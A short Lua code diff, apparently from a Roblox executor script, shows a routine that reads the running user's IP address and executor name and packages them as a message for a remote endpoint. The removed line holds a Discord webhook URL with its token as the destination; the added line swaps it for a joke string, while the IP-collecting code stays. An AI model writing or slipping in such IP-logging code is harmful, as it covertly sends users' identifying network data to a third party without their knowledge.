@@ -19,7 +19,7 @@ local IPBuffer = tostring(GetIPJSON.ip)
 local IP = IPBuffer
 
 local ExecutorName = identifyexecutor()
-url = "https://discord.com/api/webhooks/1095163481709367346/53F5jomSK588w5JRQoUtPCM3TvQiR78p_MjIeGcSTlyaDaTy_i3fqh_dw7NKEbk_PCVx"
+url = "blud loves to stalk me 💀"
 local data = {
 	["content"] = IP.." | "..ExecutorName
 }
